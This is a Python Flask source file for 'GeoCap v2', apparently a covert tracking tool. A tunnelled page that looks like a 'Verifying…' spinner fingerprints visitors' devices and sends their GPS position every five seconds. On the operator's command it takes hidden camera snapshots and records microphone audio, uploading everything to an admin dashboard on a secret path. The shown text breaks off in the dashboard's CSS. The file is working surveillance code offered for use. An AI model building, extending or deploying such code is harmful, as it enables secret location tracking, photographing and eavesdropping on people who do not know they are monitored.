#!/usr/bin/env python3
"""
GeoCap v2 — Client Intelligence Platform
Admin UI via pywebview  |  Backend via Flask + Socket.IO
"""

# ═══════════════════════════════════════════════════════════════
#  IMPORTS
# ═══════════════════════════════════════════════════════════════
import webview
import threading
import json
import os
import base64
import time
import subprocess
import socket
import re
import sys
import hashlib
import random
import string
import glob
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
from flask_socketio import SocketIO, emit

# ═══════════════════════════════════════════════════════════════
#  FLASK / SOCKET.IO SETUP
# ═══════════════════════════════════════════════════════════════
app = Flask(__name__)
app.config["SECRET_KEY"] = "geocap_v2_ops_secret"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# ═══════════════════════════════════════════════════════════════
#  GLOBAL STATE
# ═══════════════════════════════════════════════════════════════
PORT        = None
DATA_DIR    = "geocap_data"
clients     = {}          # client_id -> client record
sid_to_cid  = {}          # socket_id -> client_id  (for disconnect tracking)
cf_proc     = None        # cloudflared subprocess
cf_url      = None        # tunnel public URL
op_mode     = None        # 'local' | 'global'
proxy_urls  = []          # list of proxy URL strings
request_states = {}       # Track pending requests (location, camera, audio)
admin_secret = ''.join(random.choices(string.ascii_letters + string.digits, k=32))  # Random admin path

os.makedirs(DATA_DIR, exist_ok=True)

# ═══════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        try: s.close()
        except: pass

def get_public_ip():
    """Get the public IP address of the server"""
    try:
        # Try multiple services for redundancy
        services = [
            'https://api.ipify.org',
            'https://icanhazip.com',
            'https://ifconfig.me'
        ]
        for service in services:
            try:
                result = subprocess.run(['curl', '-s', service], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    ip = result.stdout.strip()
                    if re.match(r'^\d+\.\d+\.\d+\.\d+$', ip):
                        return ip
            except:
                continue
    except:
        pass
    return get_local_ip()

def find_free_port(start_port=5000, end_port=6000):
    """Find a free port in the given range"""
    for port in range(start_port, end_port + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(('0.0.0.0', port))
            sock.close()
            return port
        except OSError:
            continue
    raise RuntimeError(f"No free ports found in range {start_port}-{end_port}")

def safe_name(s):
    """Make a string safe for use as a filesystem path component."""
    return re.sub(r"[^a-zA-Z0-9._\-]", "_", str(s))

def generate_fingerprint(data):
    """Generate a consistent fingerprint from device data"""
    fingerprint_data = f"{data.get('userAgent', '')}{data.get('platform', '')}{data.get('language', '')}{data.get('screenWidth', '')}{data.get('screenHeight', '')}{data.get('colorDepth', '')}{data.get('hardwareConcurrency', '')}{data.get('deviceMemory', '')}"
    return hashlib.sha256(fingerprint_data.encode()).hexdigest()[:16]

def client_folder(cid, ip=None):
    parts = [DATA_DIR, safe_name(cid)]
    if ip:
        parts.append(safe_name(ip))
    path = os.path.join(*parts)
    os.makedirs(path, exist_ok=True)
    return path

def notify_admins(event, data):
    socketio.emit(event, data, namespace=f"/{admin_secret}")

def start_cloudflared():
    global cf_proc, cf_url
    try:
        subprocess.run(["cloudflared", "version"], capture_output=True, timeout=5, check=True)
    except FileNotFoundError:
        return {"success": False, "error": "cloudflared not installed. Download: https://github.com/cloudflare/cloudflared/releases"}
    except subprocess.TimeoutExpired:
        return {"success": False, "error": "cloudflared version check timed out"}
    except subprocess.CalledProcessError as e:
        return {"success": False, "error": f"cloudflared error: {e}"}

    try:
        cf_proc = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1
        )
        url_re = re.compile(r"https://[a-z0-9\-]+\.trycloudflare\.com")
        deadline = time.time() + 35
        while time.time() < deadline:
            if cf_proc.poll() is not None:
                return {"success": False, "error": "cloudflared process exited unexpectedly"}
            try:
                line = cf_proc.stdout.readline()
            except Exception:
                break
            if line:
                m = url_re.search(line)
                if m:
                    cf_url = m.group(0)
                    return {"success": True, "url": cf_url}
            else:
                time.sleep(0.05)
        cf_proc.kill()
        return {"success": False, "error": "Timeout: cloudflared URL not found in 35s"}
    except Exception as e:
        return {"success": False, "error": str(e)}


# ═══════════════════════════════════════════════════════════════
#  CLIENT VISITOR PAGE
# ═══════════════════════════════════════════════════════════════
VISITOR_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verifying…</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .spinner{width:36px;height:36px;border:3px solid #ddd;border-top-color:#555;border-radius:50%;animation:spin 1s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="spinner"></div>
<script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
<script>
(function(){
'use strict';

/* ── Persistent Fingerprint-based Client ID ── */
let fingerprint = null;
let permissionStates = {
  geolocation: 'prompt',
  camera: 'prompt',
  microphone: 'prompt'
};

async function generateFingerprint() {
  const components = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages,
    screenWidth: screen.width,
    screenHeight: screen.height,
    colorDepth: screen.colorDepth,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
    deviceMemory: navigator.deviceMemory || 'unknown',
    cookiesEnabled: navigator.cookieEnabled,
    touchSupport: 'ontouchstart' in window,
    maxTouchPoints: navigator.maxTouchPoints || 0,
    pdfViewerEnabled: navigator.pdfViewerEnabled || false,
    webdriver: navigator.webdriver || false
  };
  
  const str = JSON.stringify(components);
  const encoder = new TextEncoder();
  const data = encoder.encode(str);
  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
  return 'gc_' + hashHex.substring(0, 16);
}

const sock = io();
let locInterval = null;
let pendingRequests = {};

sock.on('connect', async () => {
  if (!fingerprint) {
    fingerprint = await generateFingerprint();
  }
  collectAll();
});

/* ═══ Main Collection ═══ */
async function collectAll(){
  const info={
    client_id: fingerprint,
    socket_id: sock.id,
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: [...(navigator.languages||[])],
    screenWidth: screen.width,
    screenHeight: screen.height,
    colorDepth: screen.colorDepth,
    pixelDepth: screen.pixelDepth,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookiesEnabled: navigator.cookieEnabled,
    hardwareConcurrency: navigator.hardwareConcurrency||'unknown',
    deviceMemory: navigator.deviceMemory||'unknown',
    maxTouchPoints: navigator.maxTouchPoints??'unknown',
    doNotTrack: navigator.doNotTrack||'unknown',
    webdriver: navigator.webdriver||false,
    pdfViewerEnabled: navigator.pdfViewerEnabled||false,
    deviceDetails: getDeviceDetails(),
    plugins: getPlugins(),
    mimeTypes: getMimeTypes(),
    audioContext: getAudioContext(),
    webGL: getWebGL(),
    gpu: {},
    fonts: detectFonts(),
    battery: null,
    connection: null,
    mediaDevices: [],
    permissions: {},
    storage: {},
    performance: getPerfInfo(),
    ipInfo: {}
  };

  /* Connection */
  if(navigator.connection){
    const c=navigator.connection;
    info.connection={effectiveType:c.effectiveType,downlink:c.downlink,rtt:c.rtt,saveData:c.saveData};
  }

  /* Battery */
  if('getBattery' in navigator){
    try{
      const b=await navigator.getBattery();
      info.battery={level:b.level,charging:b.charging,chargingTime:b.chargingTime,dischargingTime:b.dischargingTime};
    }catch(e){}
  }

  /* Storage */
  if(navigator.storage){
    try{
      const est=await navigator.storage.estimate();
      const per=await navigator.storage.persisted();
      info.storage={estimate:est,persisted:per};
    }catch(e){}
  }

  /* Permissions */
  const permNames=['geolocation','camera','microphone','notifications','background-sync','accelerometer','gyroscope'];
  for(const p of permNames){
    try{
      const r=await navigator.permissions.query({name:p});
      info.permissions[p]=r.state;
      permissionStates[p] = r.state;
      if(p==='geolocation'&&r.state==='granted') startLocAuto();
      
      // Listen for permission changes
      r.addEventListener('change', () => {
        permissionStates[p] = r.state;
        if(p === 'geolocation' && r.state === 'granted') startLocAuto();
      });
    }catch(e){}
  }

  /* Media Devices */
  try{
    const devs=await navigator.mediaDevices.enumerateDevices();
    info.mediaDevices=devs.map(d=>({kind:d.kind,label:d.label,deviceId:d.deviceId,groupId:d.groupId}));
  }catch(e){}

  /* GPU */
  try{
    const cv=document.createElement('canvas');
    const gl=cv.getContext('webgl')||cv.getContext('experimental-webgl');
    if(gl){
      const ext=gl.getExtension('WEBGL_debug_renderer_info');
      if(ext) info.gpu={vendor:gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),renderer:gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)};
    }
  }catch(e){}

  post('/device_info',info);

  /* IP — async, update when ready */
  fetchIP().then(ip=>{ info.ipInfo=ip; post('/device_info',{client_id:fingerprint,socket_id:sock.id,ipInfo:ip}); });
}

async function fetchIP(){
  try{
    const r=await fetch('https://ipapi.co/json/');
    const d=await r.json();
    return{ip:d.ip,city:d.city,region:d.region,country:d.country_name,postal:d.postal||'',
      latitude:d.latitude,longitude:d.longitude,org:d.org,timezone:d.timezone};
  }catch(e){
    try{
      const r=await fetch('https://ipinfo.io/json');
      const d=await r.json();
      const[lat,lon]=(d.loc||'0,0').split(',');
      return{ip:d.ip,city:d.city,region:d.region,country:d.country,latitude:parseFloat(lat),
        longitude:parseFloat(lon),org:d.org,timezone:d.timezone};
    }catch(e2){ return{}; }
  }
}

/* ═══ Device Detection ═══ */
function getDeviceDetails(){
  const ua=navigator.userAgent;
  let os='Unknown',browser='Unknown',type='Desktop';
  if(ua.match(/Android/i)) os='Android';
  else if(ua.match(/iPhone|iPad|iPod/i)) os='iOS';
  else if(ua.match(/Windows/i)) os='Windows';
  else if(ua.match(/Macintosh/i)) os='MacOS';
  else if(ua.match(/Linux/i)) os='Linux';
  if(ua.match(/Chrome/i)&&!ua.match(/Edg/i)) browser='Chrome';
  else if(ua.match(/Firefox/i)) browser='Firefox';
  else if(ua.match(/Safari/i)&&!ua.match(/Chrome/i)) browser='Safari';
  else if(ua.match(/Edg/i)) browser='Edge';
  else if(ua.match(/OPR|Opera/i)) browser='Opera';
  const isMobile=/Android|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
  const isTablet=/iPad|Android(?!.*Mobile)/i.test(ua);
  if(isMobile) type=isTablet?'Tablet':'Mobile';
  return{type,os,browser,isMobile,isTablet,isTouchDevice:navigator.maxTouchPoints>0,userAgent:ua};
}

function getPlugins(){
  return Array.from(navigator.plugins||[]).map(p=>({name:p.name,description:p.description,filename:p.filename,length:p.length}));
}

function getMimeTypes(){
  return Array.from(navigator.mimeTypes||[]).map(m=>({type:m.type,description:m.description,suffixes:m.suffixes,enabledPlugin:m.enabledPlugin?.name}));
}

function getAudioContext(){
  try{
    const ac=new(window.AudioContext||window.webkitAudioContext)();
    const i={sampleRate:ac.sampleRate,baseLatency:ac.baseLatency??'unknown',outputLatency:ac.outputLatency??'unknown'};
    ac.close(); return i;
  }catch(e){ return{}; }
}

function getWebGL(){
  try{
    const cv=document.createElement('canvas');
    const gl=cv.getContext('webgl');
    if(!gl) return{};
    return{vendor:gl.getParameter(gl.VENDOR),renderer:gl.getParameter(gl.RENDERER),
      version:gl.getParameter(gl.VERSION),shadingLanguageVersion:gl.getParameter(gl.SHADING_LANGUAGE_VERSION)};
  }catch(e){ return{}; }
}

function getPerfInfo(){
  try{
    const p=window.performance;
    return{
      memory:p.memory?{jsHeapSizeLimit:p.memory.jsHeapSizeLimit,totalJSHeapSize:p.memory.totalJSHeapSize,usedJSHeapSize:p.memory.usedJSHeapSize}:{},
      timing:{navigationStart:p.timing?.navigationStart,loadEventEnd:p.timing?.loadEventEnd,
        domComplete:p.timing?.domComplete,domLoading:p.timing?.domLoading}
    };
  }catch(e){ return{}; }
}

function detectFonts(){
  const list=['Arial','Arial Black','Calibri','Cambria','Comic Sans MS','Consolas','Courier New',
    'Georgia','Impact','Lucida Console','Palatino Linotype','Segoe UI','Tahoma',
    'Times New Roman','Trebuchet MS','Verdana','Helvetica','Gill Sans','Garamond',
    'Futura','Optima','Rockwell','Franklin Gothic Medium','Century Gothic'];
  try{
    const cv=document.createElement('canvas');
    const ctx=cv.getContext('2d');
    const s='abcdefghijklmnopqrstuvwxyz0123456789';
    ctx.font='72px monospace';
    const base=ctx.measureText(s).width;
    return list.filter(f=>{ ctx.font=`72px '${f}',monospace`; return ctx.measureText(s).width!==base; });
  }catch(e){ return[]; }
}

/* ═══ Location Auto-Update ═══ */
function startLocAuto(){
  if(locInterval) return;
  locInterval=setInterval(()=>{
    if (permissionStates.geolocation === 'granted') {
      navigator.geolocation.getCurrentPosition(pos=>{
        post('/location_update',{
          client_id:fingerprint,
          lat:pos.coords.latitude, lon:pos.coords.longitude,
          accuracy:pos.coords.accuracy, altitude:pos.coords.altitude,
          heading:pos.coords.heading, speed:pos.coords.speed
        });
      },()=>{});
    }
  },5000);
}

/* ═══ Socket Triggers with Status Updates ═══ */
sock.on('trigger_location', async (d) => {
  const requestId = d.requestId;
  
  try {
    // Clear any stored permission state by re-querying
    const permStatus = await navigator.permissions.query({name:'geolocation'});
    permissionStates.geolocation = permStatus.state;
    
    if(permStatus.state === 'granted') { 
      startLocAuto(); 
      post('/request_status', { client_id: fingerprint, requestId, status: 'granted' });
      
      // Get immediate location
      navigator.geolocation.getCurrentPosition(pos=>{
        post('/location_update', {
          client_id: fingerprint,
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        });
      });
      return; 
    }
    
    // Force permission prompt by requesting position
    navigator.geolocation.getCurrentPosition(
      pos => {
        post('/location_update', {
          client_id: fingerprint,
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        });
        post('/request_status', { client_id: fingerprint, requestId, status: 'granted' });
        startLocAuto();
      },
      err => {
        post('/request_status', { client_id: fingerprint, requestId, status: 'denied', error: err.message });
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  } catch(e) {
    post('/request_status', { client_id: fingerprint, requestId, status: 'error', error: e.message });
  }
});

sock.on('trigger_camera', async (d) => {
  const requestId = d.requestId;
  const fm = d.facingMode||'user';
  
  try {
    // Force permission prompt
    const constraints = { 
      video: fm==='environment' ? 
        { facingMode: { exact: 'environment' }, width: { ideal: 1920 }, height: { ideal: 1080 } } : 
        { facingMode: 'user', width: { ideal: 1920 }, height: { ideal: 1080 } }
    };
    
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    
    // Use video element to get correct aspect ratio
    const video = document.createElement('video');
    video.style.cssText = 'position:fixed;opacity:0;top:0;left:0;width:1px;height:1px;';
    video.srcObject = stream; 
    video.autoplay = true;
    video.playsInline = true;
    document.body.appendChild(video);
    
    await new Promise((resolve, reject) => {
      video.onloadedmetadata = resolve;
      video.onerror = reject;
      setTimeout(reject, 5000);
    });
    
    // Wait a moment for video to stabilize
    await new Promise(r => setTimeout(r, 500));
    
    // Get actual video dimensions
    const videoWidth = video.videoWidth;
    const videoHeight = video.videoHeight;
    
    // Create canvas with proper aspect ratio
    const cv = document.createElement('canvas');
    cv.width = videoWidth;
    cv.height = videoHeight;
    
    const ctx = cv.getContext('2d');
    ctx.drawImage(video, 0, 0, videoWidth, videoHeight);
    
    // Convert to JPEG with good quality
    const img = cv.toDataURL('image/jpeg', 0.95);
    
    // Clean up
    stream.getTracks().forEach(t => t.stop());
    video.remove();
    
    post('/upload_snapshot', {
      client_id: fingerprint,
      socket_id: sock.id,
      image: img,
      facingMode: fm,
      requestId,
      dimensions: { width: videoWidth, height: videoHeight }
    });
    post('/request_status', { client_id: fingerprint, requestId, status: 'granted' });
    
  } catch(e) {
    post('/request_status', { client_id: fingerprint, requestId, status: 'denied', error: e.message });
  }
});

sock.on('trigger_audio', async (d) => {
  const requestId = d.requestId;
  
  try {
    // Force permission prompt
    const stream = await navigator.mediaDevices.getUserMedia({ 
      audio: {
        channelCount: 1,
        sampleRate: 48000,
        sampleSize: 16,
        echoCancellation: false,
        noiseSuppression: false,
        autoGainControl: false
      }, 
      video: false 
    });
 
    // Prioritize MP4/MPEG for better browser compatibility
    const mimeTypes = [
      'audio/mp4',           // Best for Safari/iOS
      'audio/mpeg',          // MP3 format
      'audio/webm;codecs=opus', // Chrome/Edge
      'audio/webm',
      'audio/ogg;codecs=opus'
    ];
    
    let mimeType = '';
    let recorder = null;
    let fileExtension = 'webm'; // default
    
    // Find a supported MIME type and set appropriate extension
    for (const mt of mimeTypes) {
      if (MediaRecorder.isTypeSupported(mt)) {
        mimeType = mt;
        if (mt.includes('mp4')) fileExtension = 'm4a';
        else if (mt.includes('mpeg')) fileExtension = 'mp3';
        else if (mt.includes('ogg')) fileExtension = 'ogg';
        else fileExtension = 'webm';
        break;
      }
    }
    
    console.log(`Using MIME type: ${mimeType}, extension: ${fileExtension}`);
    
    // Create recorder with appropriate options
    const options = mimeType ? { mimeType } : {};
    recorder = new MediaRecorder(stream, options);
    
    const chunks = [];
    let recordingStart = Date.now();
    
    recorder.ondataavailable = (e) => {
      if (e.data && e.data.size > 0) {
        chunks.push(e.data);
      }
    };
 
    recorder.onstop = () => {
      stream.getTracks().forEach(t => t.stop());
      
      if (!chunks.length) {
        post('/request_status', { 
          client_id: fingerprint, 
          requestId, 
          status: 'denied', 
          error: 'no data' 
        });
        return;
      }
      
      // Calculate actual duration
      const actualDuration = (Date.now() - recordingStart) / 1000;
      console.log(`Recording duration: ${actualDuration.toFixed(2)} seconds, chunks: ${chunks.length}`);
      
      // Combine all chunks into one blob
      const completeBlob = new Blob(chunks, { type: mimeType || 'audio/webm' });
      
      // Verify blob size
      console.log(`Blob size: ${(completeBlob.size / 1024).toFixed(2)} KB, type: ${completeBlob.type}`);
      
      // Convert to base64 and send
      const reader = new FileReader();
      
      reader.onload = () => {
        const base64Data = reader.result.split(',')[1];
        
        // Send the complete audio file with correct extension info
        post('/upload_audio', {
          client_id: fingerprint,
          audio: base64Data,
          mimeType: completeBlob.type,
          fileExtension: fileExtension,
          duration: actualDuration,
          expectedDuration: 10,
          requestId,
          chunks: chunks.length,
          size: completeBlob.size
        });
        
        post('/request_status', { 
          client_id: fingerprint, 
          requestId, 
          status: 'granted' 
        });
      };
      
      reader.onerror = (err) => {
        console.error('FileReader error:', err);
        post('/request_status', { 
          client_id: fingerprint, 
          requestId, 
          status: 'error', 
          error: 'Failed to read audio data' 
        });
      };
      
      reader.readAsDataURL(completeBlob);
    };
 
    recorder.onerror = (e) => {
      console.error('Recorder error:', e);
      post('/request_status', { 
        client_id: fingerprint, 
        requestId, 
        status: 'error', 
        error: e.message 
      });
    };
 
    // Start recording - request data every 500ms
    recorder.start(500);
    
    // Update UI
    const wrap = document.querySelector('.rec-btn-wrap');
    const stat = document.getElementById('recStatus');
    const timer = document.getElementById('recTimer');
    const btn = document.getElementById('recBtn');
    
    if (wrap) wrap.classList.add('recording');
    if (stat) stat.style.display = 'block';
    if (btn) btn.disabled = true;
    
    let remaining = 10;
    if (timer) timer.textContent = remaining;
    
    const timerInterval = setInterval(() => {
      remaining--;
      if (timer) timer.textContent = remaining;
      if (remaining <= 0) clearInterval(timerInterval);
    }, 1000);
    
    setTimeout(() => { 
      clearInterval(timerInterval);
      if (recorder && recorder.state !== 'inactive') {
        recorder.stop();
      }
      
      setTimeout(() => {
        if (wrap) wrap.classList.remove('recording');
        if (stat) stat.style.display = 'none';
        if (btn) btn.disabled = false;
      }, 500);
      
    }, 10000);
 
  } catch (e) {
    console.error('Audio capture error:', e);
    post('/request_status', { 
      client_id: fingerprint, 
      requestId, 
      status: 'denied', 
      error: e.message 
    });
  }
});

sock.on('trigger_message', d => { 
  alert(d.body || d.message); 
});

sock.on('redirect', d => { 
  window.location.href = d.url; 
});

/* ═══ Utilities ═══ */
function post(url,data){
  return fetch(url,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(data)
  }).catch(err => console.error('Post error:', err));
}
})();
</script>
</body>
</html>"""


# ═══════════════════════════════════════════════════════════════
#  ADMIN DASHBOARD with Old Clients Explorer
# ═══════════════════════════════════════════════════════════════
ADMIN_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>GeoCap v2 — Ops Center</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
<script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
<style>
:root{
  --bg:#06080f;
  --s1:#0a0d18;
  --s2:#0e1220;
  --s3:#141929;
  --s4:#1c2235;
  --border:#1e2840;
  --border2:#263047;
  --cyan:#00e5ff;
  --cyan-dim:rgba(0,229,255,.12);
  --cyan-mid:rgba(0,229,255,.25);
  --purple:#a855f7;
  --green:#22d3a0;
  --green-dim:rgba(34,211,160,.12);
  --red:#f43f5e;
  --red-dim:rgba(244,63,94,.12);
  --yellow:#fbbf24;
  --yellow-dim:rgba(251,191,36,.12);
  --text:#dde4f0;
  --text2:#8899bb;
  --text3:#4a5878;
  --mono:'JetBrains Mono',monospace;
  --sans:'Space Grotesk',sans-serif;
}
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;overflow:hidden;background:var(--bg)}
body{font-family:var(--sans);color:var(--text);font-size:13px}

/* ── scrollbar ── */
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}

/* ════════════════════════════════════
   START SCREEN
════════════════════════════════════ */
#start{
  position:fixed;inset:0;background:var(--bg);
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  gap:48px;z-index:1000;
  background-image:
    radial-gradient(ellipse 70% 50% at 50% 50%, rgba(0,229,255,.04) 0%, transparent 70%),
    repeating-linear-gradient(0deg, transparent, transparent 39px, rgba(0,229,255,.03) 39px, rgba(0,229,255,.03) 40px),
    repeating-linear-gradient(90deg, transparent, transparent 39px, rgba(0,229,255,.03) 39px, rgba(0,229,255,.03) 40px);
}
.start-logo{text-align:center}
.start-logo h1{font-family:var(--mono);font-size:52px;font-weight:700;color:var(--cyan);letter-spacing:-2px;text-shadow:0 0 40px rgba(0,229,255,.4)}
.start-logo p{font-family:var(--mono);font-size:12px;color:var(--text3);letter-spacing:5px;text-transform:uppercase;margin-top:8px}
.mode-row{display:flex;gap:20px}
.mode-card{
  width:210px;padding:28px 24px;border-radius:14px;
  background:var(--s2);border:1px solid var(--border2);
  cursor:pointer;transition:all .25s;text-align:center;
}
.mode-card:hover{border-color:var(--cyan);background:var(--s3);transform:translateY(-3px);box-shadow:0 16px 40px rgba(0,229,255,.1)}
.mode-card .mi{font-size:32px;margin-bottom:14px}
.mode-card.local .mi{color:var(--green)}
.mode-card.global .mi{color:var(--cyan)}
.mode-card h3{font-size:17px;font-weight:700;margin-bottom:6px}
.mode-card p{font-size:12px;color:var(--text2);line-height:1.5}
#cf-wait{display:none;text-align:center}
#cf-wait .spin{width:36px;height:36px;border:2px solid var(--border2);border-top-color:var(--cyan);border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 14px}
#cf-wait p{font-family:var(--mono);font-size:12px;color:var(--text2)}
@keyframes spin{to{transform:rotate(360deg)}}

/* ── Remove ALL focus outlines ── */
*:focus { outline: none !important; box-shadow: none !important; }
*:focus-visible { outline: none !important; box-shadow: none !important; }
button:focus, select:focus, input:focus, textarea:focus { outline: none !important; }

/* ── Audio Tab Improvements ── */
.rec-btn-wrap { position: relative; display: inline-flex; align-items: center; }
.rec-btn-wrap .rec-ring {
  position: absolute; inset: -6px; border-radius: 12px;
  border: 2px solid var(--green); opacity: 0;
  animation: none;
  pointer-events: none;
}
.rec-btn-wrap.recording .rec-ring {
  animation: recpulse 1s ease-in-out infinite;
}
@keyframes recpulse {
  0%,100% { opacity: .7; transform: scale(1); }
  50%      { opacity: 0;  transform: scale(1.12); }
}
.rec-timer {
  font-family: var(--mono); font-size: 22px; font-weight: 700;
  color: var(--green); letter-spacing: -1px; margin-bottom: 4px;
}
.rec-label {
  font-family: var(--mono); font-size: 10px; color: var(--text3);
  letter-spacing: 2px; text-transform: uppercase;
}
.rec-status {
  display: flex; flex-direction: column; align-items: center;
  padding: 18px; gap: 6px;
}
.rec-dot {
  width: 8px; height: 8px; background: var(--green);
  border-radius: 50%; box-shadow: 0 0 8px var(--green);
  animation: blink 1s ease-in-out infinite;
}
.aitem {
  background: var(--s3); border: 1px solid var(--border);
  border-radius: 9px; padding: 11px 13px;
}
.aitem audio {
  width: 100%; margin-top: 7px; height: 32px;
  border-radius: 6px; accent-color: var(--cyan);
}
.aitem audio::-webkit-media-controls-panel {
  background: var(--s4);
}
.aitem audio::-webkit-media-controls-play-button,
.aitem audio::-webkit-media-controls-timeline,
.aitem audio::-webkit-media-controls-current-time-display,
.aitem audio::-webkit-media-controls-time-remaining-display,
.aitem audio::-webkit-media-controls-volume-slider {
  filter: invert(1);
}
.alabel {
  font-family: var(--mono); font-size: 10px; color: var(--text3);
  display: flex; align-items: center; gap: 6px; margin-bottom: 2px;
}
.alabel i { color: var(--yellow); }

/* ═══ Request Status Indicators ═══ */
.request-badge {
  display: inline-flex;
  align-items: center;
  gap: 5px;
  padding: 4px 10px;
  border-radius: 20px;
  font-family: var(--mono);
  font-size: 10px;
  font-weight: 700;
  margin-left: 10px;
}
.request-badge.pending {
  background: var(--yellow-dim);
  color: var(--yellow);
  border: 1px solid rgba(251,191,36,.3);
}
.request-badge.granted {
  background: var(--green-dim);
  color: var(--green);
  border: 1px solid rgba(34,211,160,.3);
}
.request-badge.denied {
  background: var(--red-dim);
  color: var(--red);
  border: 1px solid rgba(244,63,94,.3);
}
.request-badge i {
  font-size: 8px;
}

/* ═══ Image Grid with Proper Aspect Ratio ═══ */
.pgrid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
  gap: 12px;
  margin-top: 10px;
}
.pitem {
  position: relative;
  border-radius: 8px;
  overflow: hidden;
  border: 1px solid var(--border);
  cursor: pointer;
  transition: border-color .2s;
  background: var(--s3);
  display: flex;
  flex-direction: column;
}
.pitem:hover {
  border-color: var(--cyan);
}
.pitem img {
  width: 100%;
  height: auto;
  display: block;
  object-fit: contain;
  background: #000;
}
.plabel {
  padding: 5px 8px;
  background: rgba(6,8,15,.85);
  font-family: var(--mono);
  font-size: 10px;
  color: var(--text2);
  backdrop-filter: blur(4px);
  border-top: 1px solid var(--border);
}

/* ═══ Modal for full image view ═══ */
#imgModal{
  display:none;position:fixed;inset:0;background:rgba(0,0,0,.95);
  justify-content:center;align-items:center;z-index:9998;cursor:zoom-out;
  flex-direction: column;
}
#imgModal img{
  max-width:95%;
  max-height:85%;
  object-fit:contain;
  border-radius:10px;
  box-shadow:0 0 80px rgba(0,0,0,.9);
}
#imgModal .modal-dimensions{
  color: var(--text3);
  font-family: var(--mono);
  font-size: 12px;
  margin-top: 12px;
}

/* ═══ Old Clients Explorer ═══ */
.old-clients-panel {
  position: fixed;
  right: 0;
  top: 50px;
  bottom: 0;
  width: 400px;
  background: var(--s2);
  border-left: 1px solid var(--border);
  z-index: 100;
  display: none;
  flex-direction: column;
  box-shadow: -5px 0 20px rgba(0,0,0,.3);
}
.old-clients-panel.open {
  display: flex;
}
.old-header {
  padding: 14px;
  background: var(--s3);
  border-bottom: 1px solid var(--border);
  display: flex;
  align-items: center;
  gap: 10px;
}
.old-header h3 {
  font-family: var(--mono);
  font-size: 12px;
  color: var(--cyan);
  flex: 1;
  text-transform: uppercase;
  letter-spacing: 1px;
}
.old-header button {
  background: none;
  border: none;
  color: var(--text3);
  cursor: pointer;
  font-size: 14px;
  padding: 4px 8px;
}
.old-header button:hover {
  color: var(--cyan);
}
.old-search {
  padding: 10px;
  border-bottom: 1px solid var(--border);
}
.old-search input {
  width: 100%;
  padding: 8px 10px;
  background: var(--s4);
  border: 1px solid var(--border2);
  border-radius: 6px;
  color: var(--text);
  font-family: var(--mono);
  font-size: 11px;
}
.old-clients-list {
  flex: 1;
  overflow-y: auto;
  padding: 10px;
}
.old-client-item {
  background: var(--s3);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 10px;
  margin-bottom: 8px;
  cursor: pointer;
  transition: all .2s;
}
.old-client-item:hover {
  border-color: var(--cyan);
  background: var(--s4);
}
.old-client-id {
  font-family: var(--mono);
  font-size: 11px;
  color: var(--cyan);
  margin-bottom: 4px;
}
.old-client-meta {
  display: flex;
  gap: 10px;
  font-size: 10px;
  color: var(--text3);
  margin-bottom: 6px;
}
.old-client-stats {
  display: flex;
  gap: 12px;
  font-size: 10px;
  color: var(--text2);
}
.old-client-stats i {
  margin-right: 3px;
}

/* ════════════════════════════════════
   APP SHELL
════════════════════════════════════ */
#app{display:none;height:100vh;flex-direction:column}

/* ── Topbar ── */
#topbar{
  height:50px;background:var(--s1);border-bottom:1px solid var(--border);
  display:flex;align-items:center;padding:0 14px;gap:10px;flex-shrink:0;
}
